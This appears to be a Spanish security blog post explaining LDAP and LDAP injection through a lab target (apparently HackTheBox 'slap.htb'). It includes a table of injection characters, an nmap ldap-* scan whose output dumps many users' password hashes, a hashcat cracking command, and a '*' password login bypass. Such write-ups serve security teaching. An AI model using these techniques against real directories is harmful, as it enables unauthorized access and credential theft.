---
date: 2025-11-24T16:47:05.000Z
layout: post
comments: true
title: "Inyección LDAP"
subtitle: 'Y técnicas para dumpear contraseñas'
description: >-
image: >-
  /images/ldaplogo.png
optimized_image: >-
  /images/ldaplogo.png
category: ciberseguridad
tags:
  - web
  - owasp
  - nmap
  - injection
author: Felipe Canales Cayuqueo
paginate: true
---

LDAP (Lightweight Directory Access Protocol) es un protocolo diseñado para acceder, consultar y gestionar servicios de directorio, los cuales almacenan información estructurada sobre usuarios, grupos, dispositivos y otros recursos dentro de una red. Se utiliza ampliamente en entornos corporativos para autenticación, autorización y organización de identidades, permitiendo que distintas aplicaciones y sistemas consulten un repositorio centralizado. Su estructura jerárquica facilita búsquedas rápidas y eficientes, lo que lo convierte en una pieza clave en sistemas como Active Directory y otros servicios de gestión de identidades. 

Una solicitud LDAP es un mensaje que un cliente envía a un servidor para realizar operaciones sobre los datos almacenados en un servicio de directorio. Estas solicitudes están compuestas por varios elementos:

- **Session connection:** El cliente establece una conexión con el servidor a través de un puerto LDAP, normalmente 389 (LDAP) o 636 (LDAPS).
- **Request type:** Indica la operación que se desea realizar, como *bind*, *search*, *modify*, entre otras.
- **Request parameters:** Incluyen la información necesaria para ejecutar la operación, como el *Distinguished Name (DN)* de la entrada objetivo, el alcance y filtro de una búsqueda, o los atributos y valores que se desean agregar o modificar.
- **Request ID:** Es un identificador único asignado por el cliente para asociar cada solicitud con la respuesta correspondiente enviada por el servidor.

Este formato estructurado permite que los clientes interactúen de forma precisa y eficiente con servicios de directorio basados en LDAP.

La herramienta ```ldapsearch``` es una utilidad de línea de comandos que se utiliza para buscar información almacenada en un directorio utilizando el protocolo LDAP. Se utiliza comúnmente para consultar y recuperar datos de un servicio de directorio LDAP.

### LDAP Injection

La **inyección LDAP** es un ataque que afecta a aplicaciones web que utilizan LDAP (Lightweight Directory Access Protocol) para autenticar usuarios o almacenar información. El ataque consiste en inyectar código o caracteres maliciosos dentro de las consultas LDAP, con el fin de modificar su comportamiento, evadir controles de autenticación o autorización, y acceder a datos sensibles almacenados en el directorio.

Para probar posibles vectores de inyección LDAP, es común utilizar valores que incluyan caracteres especiales u operadores que alteran la lógica de la consulta:

| Entrada | Descripción |
|--------|-------------|
| `*` | El asterisco `*` puede coincidir con cualquier cantidad de caracteres. |
| `( )` | Los paréntesis `( )` permiten agrupar expresiones. |
| `|` | La barra vertical representa un operador lógico **OR**. |
| `&` | El ampersand `&` representa un operador lógico **AND**. |
| `(cn=*)` | Expresión que puede forzar una condición que **siempre sea verdadera**; útil para intentar evadir autenticación. También suelen utilizarse `(objectClass=*)` o entradas similares. |

Ejemplos como `(cn=*)` en un campo de usuario, o filtros construidos sin sanitización, pueden permitir al atacante manipular la consulta para obtener acceso no autorizado.

Los ataques de inyección LDAP son similares a los ataques de **SQL Injection**, con la diferencia de que apuntan al servicio de directorio LDAP en lugar de a una base de datos tradicional. En el siguiente caso detectamos que hay un servidor web que corre con ldap:

[![ldapinjection1](/images/ldapinjection1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/ldapinjection1.png)

Nmap cuenta con sus propios scripts personalizados que podemos usar para realizar un bypass del login.

```
┌──(root㉿nptg)-[/ldap]
└─# nmap -sC -sV --open 10.129.205.18 -p 389 --script=ldap-*
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-24 23:09 -03
Nmap scan report for 10.129.205.18
Host is up (1.1s latency).

Bug in ldap-brute: no string output.
PORT    STATE SERVICE VERSION
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       namingContexts: dc=slap,dc=htb
|       supportedControl: 2.16.840.1.113730.3.4.18
|       supportedControl: 2.16.840.1.113730.3.4.2
|       supportedControl: 1.3.6.1.4.1.4203.1.10.1
|       supportedControl: 1.3.6.1.1.22
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.826.0.1.3344810.2.3
|       supportedControl: 1.3.6.1.1.13.2
|       supportedControl: 1.3.6.1.1.13.1
|       supportedControl: 1.3.6.1.1.12
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.1
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.3
|       supportedExtension: 1.3.6.1.1.8
|       supportedLDAPVersion: 3
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedSASLMechanisms: NTLM
|       supportedSASLMechanisms: CRAM-MD5
|_      subschemaSubentry: cn=Subschema
| ldap-search: 
|   Context: dc=slap,dc=htb
|     dn: dc=slap,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: htb
|         dc: slap
|     dn: cn=admin,dc=slap,dc=htb
|         objectClass: simpleSecurityObject
|         objectClass: organizationalRole
|         cn: admin
|         description: LDAP administrator
|         userPassword: {SSHA}hfZvUhYPGqAS2X+re/FpsEUcITQNmB0F
|     dn: ou=users,dc=slap,dc=htb
|         objectClass: organizationalUnit
|         objectClass: top
|         ou: users
|     dn: ou=groups,dc=slap,dc=htb
|         objectClass: organizationalUnit
|         objectClass: top
|         ou: groups
|     dn: uid=ckirk,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: ckirk
|         cn: Kirk
|         sn: Cantu
|         loginShell: /bin/bash
|         uidNumber: 10020
|         gidNumber: 10020
|         homeDirectory: /home/ckirk
|         userPassword: {SSHA}QBifW+Zra3ZYAlBYQePrWx4L4cuhInRv
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=grudy,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: grudy
|         cn: Rudy
|         sn: Grayson
|         loginShell: /bin/bash
|         uidNumber: 10004
|         gidNumber: 10004
|         homeDirectory: /home/grudy
|         userPassword: {SSHA}nkvCpY+GAuY1EdH6DAuXGRuReBZkD9bQ
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=anigel,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: anigel
|         cn: Nigel
|         sn: Atherton
|         loginShell: /bin/bash
|         uidNumber: 10019
|         gidNumber: 10019
|         homeDirectory: /home/anigel
|         userPassword: {SSHA}IJi67vwzppiDzLr4lKlH1mQu1sz3PQGc
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=asally,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: asally
|         cn: Sally
|         sn: Anderson
|         loginShell: /bin/bash
|         uidNumber: 10002
|         gidNumber: 10002
|         homeDirectory: /home/asally
|         userPassword: {SSHA}bxeEM7AcPoNLwNecDjJDNYf3ZfSnr6Bo
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=gjacob,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: gjacob
|         cn: Jacob
|         sn: Goldman
|         loginShell: /bin/bash
|         uidNumber: 10001
|         gidNumber: 10001
|         homeDirectory: /home/gjacob
|         userPassword: {SSHA}R7Q61MbyAHJ4IZvzPFLvR0q+hwP0xLBS
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=smaria,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: smaria
|         cn: Maria
|         sn: Seepgood
|         loginShell: /bin/bash
|         uidNumber: 10006
|         gidNumber: 10006
|         homeDirectory: /home/smaria
|         userPassword: {SSHA}VvsxFVxOzaxJMjaVYWbkJxYsFVCgeDoq
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=asteven,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: asteven
|         cn: Steven
|         sn: Alundra
|         loginShell: /bin/bash
|         uidNumber: 10005
|         gidNumber: 10005
|         homeDirectory: /home/asteven
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|         userPassword: {SSHA}OJcDNVea8z+mLAVXV9IaTYidj0Vz6aVz
|     dn: uid=bfannie,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: bfannie
|         cn: Fannie
|         sn: Berg
|         loginShell: /bin/bash
|         uidNumber: 10013
|         gidNumber: 10013
|         homeDirectory: /home/bfannie
|         userPassword: {SSHA}Cgr7zt9K+ykSp+Yg4Xm0BZewgFDjRSQI
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=djennie,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: djennie
|         cn: Jennie
|         sn: Davie
|         loginShell: /bin/bash
|         uidNumber: 10012
|         gidNumber: 10012
|         homeDirectory: /home/djennie
|         userPassword: {SSHA}hLpsak+DaZp40HcwEFzZcwCpg2n8K9ox
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=gserena,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: gserena
|         cn: Serena
|         sn: Griffin
|         loginShell: /bin/bash
|         uidNumber: 10015
|         gidNumber: 10015
|         homeDirectory: /home/gserena
|         userPassword: {SSHA}sxeT0vYI1MbBNRC0MucTba6EgB6NxyCS
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=hgracie,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: hgracie
|         cn: Gracie-Leigh
|         sn: Horner
|         loginShell: /bin/bash
|         uidNumber: 10016
|         gidNumber: 10016
|         homeDirectory: /home/hgracie
|         userPassword: {SSHA}p/fiheQ2GUN2IqAaHK/wl2HGo1Rt0RBw
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=mlauren,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: mlauren
|         cn: Lauren
|         sn: Miller
|         loginShell: /bin/bash
|         homeDirectory: /home/mlauren
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|         uidNumber: 10000
|         gidNumber: 10000
|         userPassword: 58ea24488cdaba86635a7cf8f963089c
|     dn: uid=nhikaru,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: nhikaru
|         cn: Hikaru
|         sn: Nagato
|         loginShell: /bin/bash
|         uidNumber: 10007
|         gidNumber: 10007
|         homeDirectory: /home/nhikaru
|         userPassword: {SSHA}jjMINVD96xW6t0gWCpN0Ell1vag6tAm1
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=pjayden,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: pjayden
|         cn: Jayden-James
|         sn: Poole
|         loginShell: /bin/bash
|         uidNumber: 10014
|         gidNumber: 10014
|         homeDirectory: /home/pjayden
|         userPassword: {SSHA}Aec8VBL1KRPxL87aQVVZyt7o0L33rt0x
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=rusmaan,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: rusmaan
|         cn: Usmaan
|         sn: Ramirez
|         loginShell: /bin/bash
|         uidNumber: 10017
|         gidNumber: 10017
|         homeDirectory: /home/rusmaan
|         userPassword: {SSHA}/A8fnkOguGQIJXkc0HwN/6hRECCCKIS8
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
|     dn: uid=sphilip,ou=users,dc=slap,dc=htb
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: shadowAccount
|         uid: sphilip
|         cn: Philip
|         sn: Stanson
|         loginShell: /bin/bash
|         uidNumber: 10003
|         gidNumber: 10003
|         homeDirectory: /home/sphilip
|         userPassword: {SSHA}Fmt1rLhskeBKoKYSPUVqfuCtKx+IXcDM
|         shadowMax: 60
|         shadowMin: 1
|         shadowWarning: 7
|         shadowInactive: 7
| 
| 
|_Result limited to 20 objects (see ldap.maxobjects)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.85 seconds

```

Gracias a ```nmap``` obtenemos un dump de todas las credenciales en este caso la más importante es:

```
description: LDAP administrator
userPassword: {SSHA}hfZvUhYPGqAS2X+re/FpsEUcITQNmB0F
```

Sin embargo no se pudo crackear con hashcat.

```
┌──(root㉿nptg)-[/ldap]
└─# hashcat ldapadmin.txt /usr/share/wordlists/rockyou.txt
```

Visualizando las credenciales detectamos una sin formato ldap lo que facilita la detección de un usuario y contraseña válida.

```
dn: uid=mlauren,ou=users,dc=slap,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: mlauren
cn: Lauren
sn: Miller
loginShell: /bin/bash
homeDirectory: /home/mlauren
shadowMax: 60
shadowMin: 1
shadowWarning: 7
shadowInactive: 7
uidNumber: 10000
gidNumber: 10000
userPassword: 58ea24488cdaba86635a7cf8f963089c
```

Otra forma de evadir el inicio de sesión es colocando el usuario válido e inyectando ```*``` en la contraseña:

[![ldapinjection2](/images/ldapinjection2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/ldapinjection2.png)

[![ldapinjection3](/images/ldapinjection3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/ldapinjection3.png)
